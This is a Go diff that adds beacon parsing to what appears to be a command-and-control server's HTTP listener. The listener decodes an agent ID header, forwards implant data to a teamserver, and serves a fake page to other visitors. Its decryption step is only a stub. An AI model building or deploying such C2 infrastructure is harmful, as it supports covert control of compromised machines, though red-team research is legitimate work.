@@ -5,14 +5,18 @@ import (
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/x509"
+	"encoding/base64"
+	"encoding/binary"
 	"encoding/pem"
 	"errors"
 	"fmt"
 	"github.com/gin-gonic/gin"
+	"io"
 	"math/big"
 	"net/http"
 	"net/url"
 	"os"
+	"strings"
 	"time"
 )
 
@@ -142,6 +146,16 @@ func (h *HTTP) Stop() error {
 }
 
 func (h *HTTP) processRequest(ctx *gin.Context) {
+	var (
+		ExternalIP string
+		err        error
+		agentType  uint
+		beat       []byte
+		bodyData   []byte
+	)
+
+	h.Config.ParameterName = "X-Beacon-Id"
+
 	valid := false
 	u, err := url.Parse(ctx.Request.RequestURI)
 	if err == nil {
@@ -154,8 +168,53 @@ func (h *HTTP) processRequest(ctx *gin.Context) {
 		return
 	}
 
+	ExternalIP = strings.Split(ctx.Request.RemoteAddr, ":")[0]
+
+	agentType, beat, bodyData, err = parseBeatAndData(ctx, h)
+	if err != nil {
+		fmt.Println("Error: " + err.Error())
+		h.pageFake(ctx)
+		return
+	}
+
+	err = ModuleObject.ts.AgentRequest(fmt.Sprintf("%08x", agentType), beat, bodyData, h.Name, ExternalIP)
+
 	ctx.AbortWithStatus(http.StatusOK)
 	return
+}
+
+func parseBeatAndData(ctx *gin.Context, h *HTTP) (uint, []byte, []byte, error) {
+	var (
+		beat      string
+		agentType uint
+		agentInfo []byte
+		bodyData  []byte
+		err       error
+	)
+
+	params := ctx.Request.Header[h.Config.ParameterName]
+	if len(params) > 0 {
+		beat = params[0]
+	} else {
+		return 0, nil, nil, errors.New("missing beat from Headers")
+	}
+
+	agentInfo, err = base64.StdEncoding.DecodeString(beat)
+	if len(agentInfo) < 5 || err != nil {
+		return 0, nil, nil, errors.New("failed decrypt beat")
+	}
+
+	//decrypt data
+
+	agentType = uint(binary.BigEndian.Uint32(agentInfo[:4]))
+	agentInfo = agentInfo[4:]
+
+	bodyData, err = io.ReadAll(ctx.Request.Body)
+	if err != nil {
+		return 0, nil, nil, errors.New("missing agent data")
+	}
+
+	return agentType, agentInfo, bodyData, nil
 }
 
 func (h *HTTP) generateSelfSignedCert(certFile, keyFile string) error {
@@ -179,6 +238,7 @@ func (h *HTTP) generateSelfSignedCert(certFile, keyFile string) error {
 		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
 		BasicConstraintsValid: true,
 	}
+
 	template.DNSNames = []string{h.Config.HostBind}
 
 	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
